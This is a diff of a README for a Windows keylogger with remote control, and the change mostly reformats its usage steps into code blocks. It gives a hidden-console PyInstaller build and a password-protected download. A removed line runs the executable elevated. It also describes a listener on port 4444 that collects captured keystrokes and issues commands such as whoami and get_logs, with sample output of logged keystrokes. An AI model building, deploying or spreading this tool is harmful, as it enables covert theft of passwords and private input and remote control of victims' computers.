@@ -36,15 +36,19 @@ pyinstaller --onefile --noconsole keylogger.py
 Output in dist/keylogger.zip (contact for password).
 Usage 📚
 
-Start listener:python3 listener.py
+Start listener:
+```
+python3 listener.py
+```
 
-
-Run keylogger (admin):Start-Process .\dist\keylogger.exe -Verb runAs
-
+Run keylogger:
+```
+.\dist\keylogger.exe 
+```
 
 Type in any app; logs appear on listener.
 Send commands: whoami, dir, get_logs, exit.
-
+```
 Example Output 📈
 Listener Console:
 Listening on 0.0.0.0:4444...
@@ -68,7 +72,7 @@ LOG: [2025-08-07 08:00:24] o
 > exit
 Sent command: exit
 Connection closed
-
+```
 Notes 📝
 
 Admin Required: For Windows keylogging.
